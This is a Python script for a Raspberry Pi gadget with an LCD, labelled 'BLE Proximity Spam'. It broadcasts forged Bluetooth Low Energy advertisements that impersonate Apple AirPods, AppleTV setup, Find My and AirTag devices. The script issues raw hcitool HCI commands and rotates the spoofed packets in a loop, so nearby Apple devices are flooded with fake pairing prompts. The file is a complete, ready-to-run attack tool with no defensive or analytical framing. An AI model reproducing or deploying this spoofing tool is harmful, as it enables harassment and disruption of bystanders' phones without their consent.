#!/usr/bin/env python3
import sys
import os
import time
import signal
import subprocess
import random
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)

PAYLOADS = {
    "AirPods": "1e 02 01 06 1a ff 4c 00 07 19 01 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
    "AppleTV Setup": "1e 02 01 06 1a ff 4c 00 0d 0c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
    "Find My": "1e 02 01 06 1a ff 4c 00 12 19 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
    "AirTag": "1e 02 01 06 1a ff 4c 00 12 19 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
}
PAYLOAD_NAMES = list(PAYLOADS.keys())

running = True
attack_process = None

def cleanup(*_):
    global running
    running = False
    stop_attack()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

HCI_INTERFACE = "hci0"

def start_attack(payload_name: str):
    global attack_process
    stop_attack()

    payload_data = PAYLOADS[payload_name]
    
    try:
        cmd_data = f"hcitool -i {HCI_INTERFACE} cmd 0x08 0x0008 {payload_data}"
        subprocess.run(cmd_data, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        cmd_enable = f"hcitool -i {HCI_INTERFACE} cmd 0x08 0x000a 01"
        attack_process = subprocess.Popen(cmd_enable, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"Error starting attack: {e}", file=sys.stderr)
        return False

def stop_attack():
    global attack_process
    if attack_process:
        attack_process.terminate()
        attack_process = None
    
    try:
        cmd_disable = f"hcitool -i {HCI_INTERFACE} cmd 0x08 0x000a 00"
        subprocess.run(cmd_disable, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass

def draw_ui(status: str, current_payload: str):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)

    d.text((5, 5), "BLE Proximity Spam", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    status_color = "lime" if status == "ACTIVE" else "red"
    d.text((30, 35), status, font=FONT_STATUS, fill=status_color)

    d.text((5, 60), "Payload:", font=FONT, fill="white")
    d.text((15, 75), current_payload, font=FONT_TITLE, fill="yellow")

    d.text((5, 110), "OK=Start/Stop | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

if __name__ == "__main__":
    try:
        is_attacking = False
        current_payload_index = 0
        
        if subprocess.run("which hcitool", shell=True, capture_output=True).returncode != 0:
            draw_ui("ERROR", "hcitool not found")
            time.sleep(5)
            raise SystemExit("hcitool not found")

        draw_ui("STOPPED", PAYLOAD_NAMES[current_payload_index])

        while running:
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break

            if GPIO.input(PINS["OK"]) == 0:
                is_attacking = not is_attacking
                if is_attacking:
                    if not start_attack(PAYLOAD_NAMES[current_payload_index]):
                        draw_ui("ERROR", "Failed to start")
                        time.sleep(3)
                        is_attacking = False
                else:
                    stop_attack()
                
                draw_ui("ACTIVE" if is_attacking else "STOPPED", PAYLOAD_NAMES[current_payload_index])
                time.sleep(0.5)

            if GPIO.input(PINS["UP"]) == 0 or GPIO.input(PINS["DOWN"]) == 0:
                if not is_attacking:
                    if GPIO.input(PINS["UP"]) == 0:
                        current_payload_index = (current_payload_index - 1) % len(PAYLOAD_NAMES)
                    else:
                        current_payload_index = (current_payload_index + 1) % len(PAYLOAD_NAMES)
                    draw_ui("STOPPED", PAYLOAD_NAMES[current_payload_index])
                    time.sleep(0.3)

            if is_attacking:
                current_payload_index = (current_payload_index + 1) % len(PAYLOAD_NAMES)
                start_attack(PAYLOAD_NAMES[current_payload_index])
                draw_ui("ACTIVE", PAYLOAD_NAMES[current_payload_index])
                
                for _ in range(20):
                    if GPIO.input(PINS["KEY3"]) == 0:
                        cleanup()
                        break
                    time.sleep(0.1)
            else:
                time.sleep(0.1)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        draw_ui("ERROR", str(e)[:20])
        time.sleep(3)
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("BLE Spam payload finished.")